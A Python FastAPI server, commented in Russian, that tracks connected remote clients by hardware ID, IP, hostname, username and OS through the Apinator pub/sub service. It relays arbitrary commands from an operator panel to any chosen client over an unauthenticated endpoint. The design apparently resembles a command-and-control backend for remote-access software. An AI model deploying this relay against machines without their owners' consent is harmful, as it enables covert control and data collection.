import os
import json
import asyncio
import time
from fastapi import FastAPI, WebSocket, HTTPException
from pydantic import BaseModel
from contextlib import asynccontextmanager
import httpx

# ========== Конфигурация Apinator ==========
APINATOR_KEY = os.environ.get("APINATOR_KEY")       # публичный ключ (для чтения)
APINATOR_SECRET = os.environ.get("APINATOR_SECRET") # секретный ключ (для публикации)
APINATOR_API_URL = "https://api.apinator.com"       # реальный URL из документации
APINATOR_WS_URL = "wss://ws.apinator.com"           # реальный URL из документации

if not APINATOR_KEY or not APINATOR_SECRET:
    raise RuntimeError("Apinator credentials not set")

# ========== Состояние сервера ==========
clients_info = {}  # hwid -> { "ip": ..., "hostname": ..., "username": ..., "os": ... }
lock = asyncio.Lock()

# ========== Модели для API ==========
class CommandRequest(BaseModel):
    target: str
    command: dict

# ========== Вспомогательные функции ==========
async def publish_to_apinator(channel: str, message: dict):
    """Отправляет сообщение в канал Apinator через REST API"""
    async with httpx.AsyncClient() as client:
        resp = await client.post(
            f"{APINATOR_API_URL}/publish",
            json={
                "key": APINATOR_KEY,
                "secret": APINATOR_SECRET,
                "channel": channel,
                "message": message
            },
            timeout=10.0
        )
        if resp.status_code != 200:
            raise Exception(f"Apinator publish error: {resp.text}")
        return resp.json()

async def send_to_client(hwid: str, command: dict):
    """Отправляет команду клиенту через его приватный канал"""
    channel = f"client_{hwid}"
    await publish_to_apinator(channel, command)

# ========== Фоновая задача: подписка на события Apinator ==========
async def apinator_listener():
    """Слушает глобальный канал присутствия и обновляет список клиентов"""
    import websockets
    uri = f"{APINATOR_WS_URL}?key={APINATOR_KEY}&secret={APINATOR_SECRET}"
    while True:
        try:
            async with websockets.connect(uri) as ws:
                # Подписываемся на канал присутствия (все клиенты)
                await ws.send(json.dumps({"event": "subscribe", "channel": "presence_global"}))
                async for message in ws:
                    data = json.loads(message)
                    event = data.get("event")
                    if event == "client_connected":
                        hwid = data.get("data", {}).get("hwid")
                        if hwid:
                            ip = data.get("data", {}).get("ip", "Unknown")
                            hostname = data.get("data", {}).get("hostname", "Unknown")
                            username = data.get("data", {}).get("username", "Unknown")
                            os = data.get("data", {}).get("os", "Unknown")
                            async with lock:
                                clients_info[hwid] = {"ip": ip, "hostname": hostname, "username": username, "os": os}
                    elif event == "client_disconnected":
                        hwid = data.get("data", {}).get("hwid")
                        if hwid:
                            async with lock:
                                clients_info.pop(hwid, None)
                    # Можно также обрабатывать обновление информации о клиенте
        except Exception as e:
            print(f"Apinator listener error: {e}")
            await asyncio.sleep(5)

# ========== FastAPI приложение ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Запускаем слушатель событий
    task = asyncio.create_task(apinator_listener())
    yield
    task.cancel()

app = FastAPI(lifespan=lifespan)

# ========== HTTP эндпоинты ==========
@app.get("/")
async def index():
    return {"status": "OK"}

@app.get("/health")
async def health():
    return {"status": "healthy"}

@app.get("/clients")
async def get_clients():
    """Возвращает список активных клиентов"""
    async with lock:
        return list(clients_info.values())

@app.post("/command")
async def send_command(req: CommandRequest):
    """Принимает команду от панели и отправляет её клиенту через Apinator"""
    try:
        await send_to_client(req.target, req.command)
        return {"status": "ok", "message": "command sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ========== WebSocket (заглушка, т.к. используем Apinator) ==========
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    await websocket.send_text("WebSocket on server is deprecated. Use Apinator.")
    await websocket.close()

# ========== Запуск ==========
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
